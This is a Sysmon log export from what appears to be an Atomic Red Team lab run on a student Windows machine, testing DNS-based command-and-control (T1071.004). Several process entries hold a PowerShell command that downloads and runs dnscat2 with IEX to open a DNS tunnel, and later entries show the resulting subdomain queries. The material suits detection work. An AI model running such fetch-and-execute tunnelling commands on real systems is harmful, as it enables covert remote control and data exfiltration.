"2025-12-22 13:59:47.899 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166352,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-0DF5-6949-E703-000000000000 ¦ PID: 9176 ¦ PGUID: E9F06A57-40C3-6949-5705-000000002100 ¦ ParentPID: 1324 ¦ ParentPGUID: E9F06A57-0DF8-6949-1B00-000000002100 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-22 12:59:47.893","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:17.557 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166356,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:17.534","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.351 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166582,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:36.889","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:40.599 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166588,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10380 ¦ PGUID: E9F06A57-4134-6949-5C05-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:40.559","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:41.749 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166591,"Cmdline: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\student\AppData\Local\Temp\RES571C.tmp"" ""c:\Users\student\AppData\Local\Temp\vqrajkvx\CSCBE84233FAB544C49983EBD3D95099C6.TMP"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.cmdline"" ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 2224 ¦ PGUID: E9F06A57-4135-6949-5D05-000000002100 ¦ ParentPID: 10380 ¦ ParentPGUID: E9F06A57-4134-6949-5C05-000000002100 ¦ Description: Microsoft® Resource File To COFF Object Conversion Utility ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 14.32.31326.0 ¦ IntegrityLevel: High ¦ OriginalFileName: CVTRES.EXE ¦ ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:41.744","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.108 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166595,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 3096 ¦ PGUID: E9F06A57-4136-6949-5E05-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:42.004","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.181 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166596,"Cmdline: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\student\AppData\Local\Temp\RES58D1.tmp"" ""c:\Users\student\AppData\Local\Temp\ndjuqk4q\CSC9C00402DC6984D0993C505423422333.TMP"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.cmdline"" ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10100 ¦ PGUID: E9F06A57-4136-6949-5F05-000000002100 ¦ ParentPID: 3096 ¦ ParentPGUID: E9F06A57-4136-6949-5E05-000000002100 ¦ Description: Microsoft® Resource File To COFF Object Conversion Utility ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 14.32.31326.0 ¦ IntegrityLevel: High ¦ OriginalFileName: CVTRES.EXE ¦ ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:42.177","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.371 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166598,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-4136-6949-6005-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:42.366","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:43.232 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166599,"Cmdline: ""C:\WINDOWS\system32\nslookup.exe"" ¦ Proc: C:\Windows\System32\nslookup.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10420 ¦ PGUID: E9F06A57-4137-6949-6105-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: nslookup ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=10FAC41C9075D456ABFBA9CD17C9A177,SHA256=123EF423B3B4623C02D60C683F5C0BCFEF232400A625FC172B7FAB04A97EB677,IMPHASH=EC3E3C718C086FAB4F7F35008A5E9116","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nslookup.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:43.225","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.224 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166343,"Query: atomicredteam-74399.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.225 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166344,"Query: atomicredteam-175376.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.465","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.225 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166345,"Query: atomicredteam-296022.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.510","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.225 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166346,"Query: atomicredteam-4139.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.829","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:18.239 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166349,"Query: atomicredteam-410258.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:16.000","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:18.239 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166350,"Query: atomicredteam-442128.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:16.319","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:19.248 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166351,"Query: atomicredteam.300791.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:17.785","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:49.869 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166353,"Query: atomicredteam.661895.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:47.897","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:00:19.913 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166354,"Query: atomicredteam.587098.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:00:17.945","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:00:49.963 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166355,"Query: atomicredteam.76334.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:00:48.128","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166358,"Query: 028.a.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.354","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166359,"Query: 029.at.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.396","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166360,"Query: 030.ato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.436","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166361,"Query: 031.atom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.477","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166362,"Query: 032.atomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.795","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166363,"Query: 033.atomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.837","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166364,"Query: 034.atomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.881","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166365,"Query: 035.atomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.924","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.310 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166366,"Query: 036.atomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:18.967","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:19.311 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166367,"Query: 037.atomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:19.286","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
